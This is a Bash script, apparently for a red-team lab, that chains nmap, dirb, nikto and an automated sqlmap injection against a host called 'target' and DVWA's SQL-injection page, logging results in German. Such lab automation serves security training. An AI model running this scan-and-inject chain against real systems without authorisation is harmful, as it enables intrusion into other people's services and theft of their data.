#!/bin/bash
set -euo pipefail

# ========================
# Red-Team Attack Script
# ========================

LOG_DIR="/logs"
MAIN_LOG="$LOG_DIR/attack.log"
NMAP_LOG="$LOG_DIR/nmap.txt"
DIRB_LOG="$LOG_DIR/dirb.txt"
NIKTO_LOG="$LOG_DIR/nikto.txt"
SQLMAP_STDOUT="$LOG_DIR/sqlmap_run.log"
SQLMAP_RESULT_DIR="$LOG_DIR/sqlmap"
TARGET_HOST="target"
TARGET_URL="http://$TARGET_HOST"

# ---------------
# Log-Funktion
# ---------------
log() {
    local msg="$1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $msg" | tee -a "$MAIN_LOG"
}

# ---------------
# Initial Checks
# ---------------
log " Starte Angriff auf Ziel: $TARGET_URL"

# Tool-Verfügbarkeit prüfen
for tool in /usr/bin/nmap /usr/bin/sqlmap /usr/bin/nikto /usr/bin/curl /usr/bin/dirb; do
    if ! [ -x "$tool" ]; then
        log " Tool nicht gefunden: $tool"
        exit 1
    fi
done

# Zielverfügbarkeit prüfen
if ! /usr/bin/curl -s --head "$TARGET_URL" | grep -q "200 OK"; then
    log " Ziel $TARGET_URL ist nicht erreichbar oder liefert keinen HTTP 200"
    exit 1
fi
log " Ziel $TARGET_URL ist erreichbar"

# --------------------------
# Nmap Scan
# --------------------------
log " Starte Nmap Scan"
/usr/bin/nmap -sV "$TARGET_HOST" -oN "$NMAP_LOG" >> "$MAIN_LOG" 2>&1
if [ $? -eq 0 ]; then
    log " Nmap Scan abgeschlossen: $NMAP_LOG"
else
    log " Nmap Scan fehlgeschlagen"
fi

# --------------------------
# Dirb Scan
# --------------------------
log " Starte Dirb Scan"

DIRB_WORDLIST="/usr/share/wordlists/dirb/common.txt"
FALLBACK_WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"

# Wordlist prüfen oder ersetzen
if ! [ -f "$DIRB_WORDLIST" ]; then
    if [ -f "$FALLBACK_WORDLIST" ]; then
        ln -sf "$FALLBACK_WORDLIST" "$DIRB_WORDLIST"
        log "  Dirb Wordlist ersetzt durch Fallback-Link"
    else
        log " Dirb Wordlist nicht gefunden, Scan übersprungen"
        goto_nikto=true
    fi
fi

if [ "${goto_nikto:-false}" != true ]; then
    /usr/bin/dirb "$TARGET_URL" "$DIRB_WORDLIST" -o "$DIRB_LOG" >> "$MAIN_LOG" 2>&1
    if [ $? -eq 0 ]; then
        log " Dirb Scan abgeschlossen: $DIRB_LOG"
    else
        log " Dirb Scan fehlgeschlagen"
    fi
fi

# --------------------------
# Nikto Scan
# --------------------------
log " Starte Nikto Scan"
/usr/bin/nikto -h "$TARGET_URL" -output "$NIKTO_LOG" >> "$MAIN_LOG" 2>&1
if [ $? -eq 0 ]; then
    log " Nikto Scan abgeschlossen: $NIKTO_LOG"
else
    log " Nikto Scan fehlgeschlagen"
fi

# --------------------------
# SQLMap Injection Test
# --------------------------
log " Starte SQLMap Scan"

SQLMAP_URL="$TARGET_URL/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
mkdir -p "$SQLMAP_RESULT_DIR"

/usr/bin/sqlmap -u "$SQLMAP_URL" --batch --output-dir="$SQLMAP_RESULT_DIR" > "$SQLMAP_STDOUT" 2>&1
if [ $? -ne 0 ]; then
    log " SQLMap Scan fehlgeschlagen"
else
    if grep -qi "is vulnerable" "$SQLMAP_STDOUT"; then
        log "[] SQLi erfolgreich auf $SQLMAP_URL"
    else
        log "[] Keine SQLi-Schwachstelle erkannt"
    fi
fi

# --------------------------
# Abschlussmeldung
# --------------------------
log "[+] Angriff abgeschlossen: $(date '+%Y-%m-%d %H:%M:%S')"
